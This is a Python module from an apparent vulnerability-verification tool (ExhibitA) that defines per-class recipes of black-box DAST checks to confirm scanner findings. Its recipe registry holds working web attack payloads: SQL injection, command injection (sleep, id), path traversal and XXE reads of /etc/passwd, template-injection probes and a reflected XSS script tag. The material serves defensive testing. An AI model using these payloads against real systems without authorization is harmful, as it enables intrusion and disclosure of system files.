"""Verification recipes: one per vulnerability class.

Each recipe carries generic black-box oracle checks — the same techniques a DAST
scanner uses — so a bug is proven by what the running app does, not by anything
planted in it. A recipe is confirmed if ANY of its checks fires. All checks run
only against the target the user pointed ExhibitA at, inside the no-network sandbox.
"""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Finding

# Signature every Linux /etc/passwd contains; proof of arbitrary file read.
PASSWD_RE = r"root:.*:0:0:"
# External-entity XML that, on a vulnerable parser, inlines /etc/passwd.
_XXE_PASSWD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    "<r>&xxe;</r>"
)


@dataclass(frozen=True)
class Recipe:
    name: str
    title: str
    rule_ids: set[str] = field(default_factory=set)
    aliases: set[str] = field(default_factory=set)
    method: str = "GET"
    send_as: str = "query"                      # query | form | path | raw_body
    content_type: str | None = None
    needs_param: bool = True                    # False for raw_body recipes
    benign_value: str = ""
    benign_marker: str | None = None            # must appear in a correct benign response
    benign_expect_status: int = 200
    checks: list[dict] = field(default_factory=list)   # oracle attempts; any firing confirms


REGISTRY: list[Recipe] = [
    Recipe(
        name="sql_injection",
        title="SQL injection",
        rule_ids={"exhibita-sql-injection"},
        aliases={"sql_injection", "sqli"},
        benign_value="alice",
        benign_marker="alice",
        checks=[
            # boolean-based: a true vs false condition changes the result set
            {"type": "diff", "true_payload": "alice' OR '1'='1' -- ",
             "false_payload": "alice' AND '1'='2' -- "},
            # error-based: a lone quote surfaces a DB error
            {"type": "signature", "payload": "alice'",
             "regex": r"(SQL syntax|sqlite3|OperationalError|SQLSTATE|ORA-\d|psycopg|near \")"},
            # time-based (for engines with SLEEP, e.g. MySQL)
            {"type": "time", "payload": "alice' OR SLEEP(5) -- ", "delay_s": 5},
        ],
    ),
    Recipe(
        name="command_injection",
        title="Command injection",
        rule_ids={"exhibita-command-injection"},
        aliases={"command_injection", "cmdi", "os_command_injection"},
        benign_value="world",
        benign_marker="world",
        checks=[
            {"type": "time", "payload": "; sleep 5 #", "delay_s": 5},
            {"type": "time", "payload": "| sleep 5", "delay_s": 5},
            {"type": "signature", "payload": "; id #", "regex": r"uid=\d+\("},
        ],
    ),
    Recipe(
        name="path_traversal",
        title="Path traversal / file disclosure",
        rule_ids={"exhibita-path-traversal"},
        aliases={"path_traversal", "lfi", "directory_traversal"},
        benign_value="public.txt",
        benign_marker="PUBLIC_FILE_OK",
        checks=[
            {"type": "signature", "payload": "../../../../../../../../etc/passwd", "regex": PASSWD_RE},
            {"type": "signature", "payload": "....//....//....//....//etc/passwd", "regex": PASSWD_RE},
        ],
    ),
    Recipe(
        name="ssti",
        title="Server-side template injection",
        rule_ids={"exhibita-template-injection"},
        aliases={"ssti", "template_injection"},
        benign_value="Alice",
        benign_marker="Alice",
        checks=[
            {"type": "expr", "payload": "{{191*193}}", "expected": "36863"},
            {"type": "expr", "payload": "${191*193}", "expected": "36863"},
            {"type": "expr", "payload": "#{191*193}", "expected": "36863"},
        ],
    ),
    Recipe(
        name="xss",
        title="Reflected XSS",
        rule_ids={"exhibita-reflected-xss"},
        aliases={"xss", "reflected_xss", "cross_site_scripting"},
        benign_value="benign-text",
        benign_marker="benign-text",
        checks=[
            {"type": "reflect", "payload": "<script>XSSPROOF11</script>", "needle": "<script>XSSPROOF11"},
        ],
    ),
    Recipe(
        name="xxe",
        title="XML external entity (XXE)",
        rule_ids={"exhibita-xxe"},
        aliases={"xxe", "xml_external_entity"},
        method="POST",
        send_as="raw_body",
        content_type="application/xml",
        needs_param=False,
        benign_value="<r>hello-xml</r>",
        benign_marker="hello-xml",
        checks=[
            {"type": "signature", "payload": _XXE_PASSWD, "regex": PASSWD_RE},
        ],
    ),
]

_BY_RULE = {rid: r for r in REGISTRY for rid in r.rule_ids}
_BY_ALIAS = {a: r for r in REGISTRY for a in r.aliases}


def recipe_for(finding: Finding, exploit_class: str | None = None) -> Recipe | None:
    """Resolve a recipe, preferring the scanner rule_id over the model's guess."""
    if finding.rule_id in _BY_RULE:
        return _BY_RULE[finding.rule_id]
    if exploit_class and exploit_class in _BY_ALIAS:
        return _BY_ALIAS[exploit_class]
    return None


def build_plan(recipe: Recipe, path: str, param: str) -> dict:
    plan = {
        "method": recipe.method,
        "path": path,
        "param": param,
        "send_as": recipe.send_as,
        "checks": recipe.checks,
        "benign_value": recipe.benign_value,
        "benign_marker": recipe.benign_marker or recipe.benign_value,
        "benign_expect_status": recipe.benign_expect_status,
    }
    if recipe.content_type:
        plan["content_type"] = recipe.content_type
    return plan
